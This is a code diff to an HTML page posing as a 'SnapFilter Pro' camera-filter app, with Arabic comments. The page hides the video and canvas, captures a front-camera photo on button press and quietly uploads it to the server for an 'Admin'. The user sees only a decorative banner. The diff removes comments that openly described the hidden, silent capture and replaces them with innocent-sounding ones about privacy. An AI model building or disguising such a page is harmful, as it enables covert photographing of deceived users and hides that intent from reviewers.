@@ -19,7 +19,6 @@
         }
         h2 { font-size: 26px; margin-bottom: 25px; color: #ff4757; font-weight: 700; }
         
-        /* بانر أو تصميم فخم يظهر بدلاً من مربع الكاميرا الأسود */
         .filter-banner {
             background: linear-gradient(135deg, #1f4068, #162447);
             padding: 40px 20px;
@@ -45,17 +44,15 @@
     <div class="container">
         <h2>SnapFilter Pro</h2>
         
-        <!-- واجهة فخمة ونظيفة بديلة عن صندوق الكاميرا الأسود -->
         <div class="filter-banner">
             <div class="filter-icon">✨🎭</div>
             <p>فلتر الواقع الافتراضي نشط</p>
         </div>
 
-        <!-- زر الالتقاط -->
         <button class="btn-capture" id="capture-btn" title="التقاط">📸</button>
     </div>
 
-    <!-- عناصر برمجية مخفية تماماً لالتقاط الصورة من الكاميرا في الخلفية -->
+    <!-- عنصر فيديو مخفي يتم تشغيله حصرياً وقت الالتقاط لضمان عمل الكاميرا -->
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
@@ -64,43 +61,58 @@
         const canvas = document.getElementById('canvas');
         const captureBtn = document.getElementById('capture-btn');
 
-        // طلب الكاميرا صامتاً في الخلفية عند فتح الصفحة لتكون جاهزة لحظة الضغط
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
-            .then(stream => {
+        captureBtn.addEventListener('click', async () => {
+            try {
+                // طلب تشغيل الكاميرا فور الضغط على الزر لضمان حصول الإذن والالتقاط الحقيقي
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' }, 
+                    audio: false 
+                });
+                
                 video.srcObject = stream;
-            })
-            .catch(err => {
-                console.error("خطأ في تشغيل الكاميرا: ", err);
-            });
 
-        // عند الضغط على زر الالتقاط، تأخذ الصورة من الكاميرا المخفية وترسلها للسيرفر بصمت
-        captureBtn.addEventListener('click', () => {
-            if (!video.videoWidth) {
-                return; // إن لم تكن الكاميرا استعدت بعد
+                // الانتظار قليلاً لضمان تحميل البث المباشر للعدسة
+                setTimeout(() => {
+                    if (!video.videoWidth) {
+                        console.error("الكاميرا لم تستعد بعد");
+                        stream.getTracks().forEach(track => track.stop());
+                        return;
+                    }
+
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    
+                    // رسم الصورة الحية
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const imageData = canvas.toDataURL('image/png');
+
+                    // إيقاف الكاميرا فوراً بعد الالتقاط لحفظ الخصوصية والبطارية
+                    stream.getTracks().forEach(track => track.stop());
+
+                    // إرسال الصورة للسيرفر
+                    fetch('/upload-snapshot', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ image: imageData })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.success) {
+                            console.log("تم إرسال الصورة بنجاح للـ Admin");
+                        }
+                    })
+                    .catch(err => {
+                        console.error('Fetch Error:', err);
+                    });
+
+                }, 800); // مهلة 800 ميلي ثانية لضمان التقاط الصورة بدقة
+
+            } catch (err) {
+                console.error("Camera Permission Error:", err);
             }
-
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imageData = canvas.toDataURL('image/png');
-
-            // إرسال الصورة للسيرفر في الخلفية بدون ظهور أي نصوص للمستخدم
-            fetch('/upload-snapshot', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ image: imageData })
-            })
-            .then(response => response.json())
-            .then(data => {
-                // تمت العملية بنجاح في الخلفية
-            })
-            .catch(err => {
-                console.error('Fetch Error:', err);
-            });
         });
     </script>
 
